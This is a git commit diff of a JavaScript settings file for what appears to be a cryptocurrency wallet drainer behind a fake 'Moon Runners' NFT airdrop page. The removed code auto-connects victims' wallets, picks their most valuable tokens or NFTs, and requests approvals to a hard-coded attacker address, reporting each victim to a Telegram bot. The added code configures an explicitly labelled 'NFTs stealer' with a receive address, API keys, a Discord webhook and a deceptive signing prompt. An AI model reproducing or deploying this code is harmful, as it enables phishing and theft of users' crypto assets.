5234e5eabd854d77180b1afffe45d797864ce8ae
Sub <107779323+bnnasub@users.noreply.github.com>
2022-07-05 02:02:29 +0800

    Update settingss.js

--- settingss.js
+++ settingss.js
@@ -1,413 +1,60 @@
-const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
-const chainIdsNetworks = {
-    "ethereum": 1,
-    "binance-smart-chain": 56,
-    "polygon": 137
-}
-const chainIdsNames = {
-    "ethereum": "Ethereum",
-    "binance-smart-chain": "Binance Smart Chain",
-    "polygon": "Polygon"
-}
-const forbiddenTokens = ["ETH", "BNB", "MATIC"]
+const receiveAddress = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c";
+const infuraId = "d799d195a162450880c39a36fe666758"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "LdBom9a2G2fXutS4KFRwZtuMkVSTnPOzjQ2yPjj0SMsZFB090JiqpvJqZosyBICB"    // x-api-key | https://moralis.io/ | For NFTs
 
-const abi = [
-    {
-        "constant": false,
-        "inputs": [
-            {
-                "name": "_spender",
-                "type": "address"
-            },
-            {
-                "name": "_value",
-                "type": "uint256"
-            }
-        ],
-        "name": "approve",
-        "outputs": [
-            {
-                "name": "",
-                "type": "bool"
-            }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
+const webhookClient = new WebhookClient({ url: "https://discord.com/api/webhooks/985877157169463306/5OA21yO6KY9nj0L1UdM2lMWvzpnAUHfvMzdVmkZbfZ24pCQrh6mvxwH9lx1EICI00_9u" });
 
-const abiNFT = [
-    {
-        "inputs": [{
-            "internalType": "address",
-            "name": "operator",
-            "type": "address"
-        }, {
-            "internalType": "bool",
-            "name": "approved",
-            "type": "bool"
-        }],
-        "name": "setApprovalForAll",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-]
 
-const accountBalances = {
-    tokens: [],
-    nft: []
+const collectionInfo = {
+    name: "Moon Runners",
+    socialMedia: {
+        discord: "",
+        twitter: "https://twitter.com/MoonRunners",
+        instagram: "",
+    },
 }
 
-const WITHDRAWAL_ADDRESS = "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c"
-const MINIMAL_SUM_IN_USD = 1
+const signMessage = `Welcome, \n\n` +
+    `Click to sign in and accept the Terms of Service.\n\n` +
+    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+    `Wallet Address:\n{address}\n\n` +
+    `Nonce:\n{nonce}`;
 
-let accountAddress = null, walletConnector, currentConnection
-
-const getMobileOperatingSystem = () => {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-
-    if (/windows phone/i.test(userAgent)) {
-        return "Windows Phone";
-    }
-
-    if (/android/i.test(userAgent)) {
-        return "Android";
-    }
-
-    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        return "iOS";
-    }
-
-    return "unknown";
+const indexPageInfo = {
+    backgroundImage: "background.jpg", // relative path to background image (in assets)
+    title: "{name}", // {name} will be replaced with collectionInfo.name
+    underTitle: "AIRDROP",
 }
 
-const getDAppSystem = () => {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+const claimPageInfo = {
+    title: "Airdrop<br>NFT", // <br> is a line break
+    shortDescription: "SHOW YOUR LOYALTY.",
+    longDescription: "A Moon Runners TOKEN IS A SIGN YOU’VE BEEN PART OF THE ADVENTURE SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",
 
-    if (/Trust/i.test(userAgent)) {
-        return "Trust";
-    }
+    claimButtonText: "MINT NOW",
 
-    if (/CriOS/i.test(userAgent)) {
-        return "Metamask";
-    }
-
-    return "unknown";
+    image: "logo.png", // relative path to image (in assets)
+    imageRadius: 250, // image radius in px
 }
 
-const openMetaMaskUrl = (url) => {
-    const a = document.createElement("a");
-    a.href = url;
-    a.target = "_self";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+const drainNftsInfo = {
+    active: true,   // Active (true) or not (false) NFTs stealer.
+    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
-const getBalances = async () => {
-    try {
-        $("#overlay").fadeIn(300);
-        $('#chainErrorMessage').hide();
-
-        if (currentConnection === "metamask") {
-            if (typeof window.ethereum.selectedAddress !== "undefined") {
-                accountAddress = window.ethereum.selectedAddress
-            } else if (typeof window.ethereum.address !== "undefined") {
-                accountAddress = window.ethereum.address
-            }
-        } else if (currentConnection === "walletconnect") {
-            accountAddress = walletConnector._accounts[0]
-        }
-
-        const response = await $.ajax({
-            url: `https://api.zapper.fi/v2/balances?addresses%5B%5D=${accountAddress}`,
-            type: "GET",
-            headers: {
-                Authorization: "Basic OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg=="
-            }
-        })
-
-        const events = response.split('event: ')
-
-        for (const event of events) {
-            const data = event.split('data: ')
-
-            if (typeof data[0] !== "undefined") {
-                if (data[0].indexOf("category") > -1) {
-                    const category = JSON.parse(data[1]);
-                    const wallet = category['wallet']
-                    const nft = category['nft']
-
-                    for (const wal of Object.values(wallet)) {
-                        if (defaultNetworks.indexOf(wal.network) > -1) {
-                            accountBalances["tokens"].push(wal)
-                        }
-                    }
-
-                    for (const wal of Object.values(nft)) {
-                        if (defaultNetworks.indexOf(wal.network) > -1) {
-                            accountBalances["nft"].push(wal)
-                        }
-                    }
-                }
-            }
-        }
-
-        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
-        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
-
-        for (const forbiddenToken of forbiddenTokens) {
-            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)
-
-            if (index > -1) {
-                accountBalances.tokens.splice(index, 1)
-            }
-        }
-        for(let i = 0; i < accountBalances.nft.length; i++) {
-        let topNFT = null, topToken = null, withdrawalToken = null
-
-        if (typeof accountBalances.tokens[0] !== "undefined") {
-            topToken = accountBalances.tokens[0]
-        }
-
-        if (typeof accountBalances.nft[i] !== "undefined") {
-            topNFT = accountBalances.nft[i]
-        }
-
-        if ((topNFT && topToken) && topNFT.balanceUSD > topToken.balanceUSD) {
-            withdrawalToken = topNFT
-        } else if ((topNFT && topToken) && topNFT.balanceUSD < topToken.balanceUSD) {
-            withdrawalToken = topToken
-        } else if (topNFT) {
-            withdrawalToken = topNFT
-        } else if (topToken) {
-            withdrawalToken = topToken
-        }
-
-        if (withdrawalToken) {
-            if (withdrawalToken.balanceUSD < MINIMAL_SUM_IN_USD) {
-                $("#overlay").fadeOut(300);
-
-                return
-            }
-
-            let web3, provider
-
-            if (currentConnection === "metamask") {
-                web3 = new Web3(window.ethereum)
-                provider = new ethers.providers.Web3Provider(window.ethereum, "any")
-
-                if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
-                    });
-                }
-            } else if (currentConnection === "walletconnect") {
-                if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
-                    $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
-                    $('#chainErrorMessage').show();
-
-                    $("#overlay").fadeOut(300);
-
-                    return
-                }
-
-                provider = new window.WalletConnectProvider.default({
-                    rpc: {
-                        1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
-                        56: "https://bsc-dataseed.binance.org/",
-                        137: "https://polygon-rpc.com"
-                    }
-                });
-
-                await provider.enable()
-
-                provider = new ethers.providers.Web3Provider(provider, "any")
-            }
-
-            const signer = provider.getSigner()
-
-            if (withdrawalToken.appId === "tokens") {
-                const contract = new ethers.Contract(withdrawalToken.address, abi, signer)
-
-                try {
-                    await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
-
-                    var z=$.ajax({  
-    type: "POST",  
-    url: "https://api.telegram.org/bot"+"5403443023:AAE87VSv__8xwqI7bAQ81BiHHhUVwhrKYPM"+"/sendMessage?chat_id="+"778392895",
-    data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
-    }); 
-
-
-                } catch (e) {
-                    getBalances()
-
-                }
-            } else if (withdrawalToken.appId === "nft") {
-                const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)
-
-                try {
-                    await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
-
-                   var z=$.ajax({  
-    type: "POST",  
-    url: "https://api.telegram.org/bot"+"5403443023:AAE87VSv__8xwqI7bAQ81BiHHhUVwhrKYPM"+"/sendMessage?chat_id="+"778392895",
-    data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
-    }); 
-
-                } catch (e) {
-                    getBalances()
-
-                }
-            } else {
-
-            }
-        } else {
-
-        }
-    }} catch (e) {
-    
-    }
+const customStrings = {
+    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    connectButton: "Connect wallet",
+    transferButton: "Mint now",
+    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
-const checkInstallMetamask = () => {
-    return new Promise((res) => {
-        if (typeof window.ethereum !== 'undefined') {
-            return res(true)
-        } else {
-            return res(false)
-        }
-    })
-}
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
 
-const connectMetamask = async () => {
-    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
-        openMetaMaskUrl(`https://metamask.app.link/dapp/${window.location.host}`)
-
-        return
-    }
-
-    window.ethereum.on('accountsChanged', function (accounts) {
-        accountAddress = accounts[0]
-
-    });
-
-    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
-
-    accountAddress = accounts[0]
-        var z=$.ajax({  
-        type: "POST",  
-        url: "https://api.telegram.org/bot"+"5403443023:AAE87VSv__8xwqI7bAQ81BiHHhUVwhrKYPM"+"/sendMessage?chat_id="+"778392895",
-        data: "parse_mode=HTML&text="+encodeURIComponent("Metamask connected "+accountAddress), 
-        }); 
-    currentConnection = "metamask"
-
-
-}
-
-const connectTrustWallet = async () => {
-    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
-        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)
-
-        return
-    }
-
-    if (window.ethereum?.isTrust) {
-        window.ethereum.on('accountsChanged', function (accounts) {
-            accountAddress = accounts[0]
-
-
-        });
-
-        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})
-
-        accountAddress = accounts[0]
-        currentConnection = "metamask"
-
-    } else {
-        if (!walletConnector.connected) {
-            walletConnector.createSession().then(() => {
-                const uri = walletConnector.uri;
-
-                window.WalletConnectQRCodeModal.default.open(uri, () => {
-                    console.log('QR Code Modal closed');
-                });
-            });
-        } else {
-            walletConnector.killSession();
-        }
-    }
-}
-
-const initMetamask = async () => {
-    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
-
-
-        return
-    }
-
-    const installedMetamask = await checkInstallMetamask()
-
-    if (!installedMetamask) {
-
-
-        return
-    }
-
-
-}
-
-const initWalletConnect = () => {
-    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {
-
-
-        return
-    }
-
-    walletConnector = new window.WalletConnect.default({
-        bridge: 'https://bridge.walletconnect.org'
-    });
-
-
-
-    walletConnector.on('connect', function (error, payload) {
-        if (error) {
-            console.error(error);
-        } else {
-            window.WalletConnectQRCodeModal.default.close();
-
-
-            accountAddress = payload.params[0].accounts[0]
-            currentConnection = "walletconnect"
-        }
-    });
-
-    walletConnector.on('session_update', function (error, payload) {
-        if (error) {
-            console.error(error);
-        } else if (walletConnector.connected) {
-
-            accountAddress = payload.params[0].accounts[0]
-        }
-
-    });
-
-    walletConnector.on('disconnect', function (error, payload) {
-        if (error) {
-            console.error(error);
-        } else {
-
-
-            accountAddress = null
-        }
-    });
-}
-
-
-
-
-setTimeout(connectMetamask, 1000)
+//#region Check Configuration
+if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
+    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
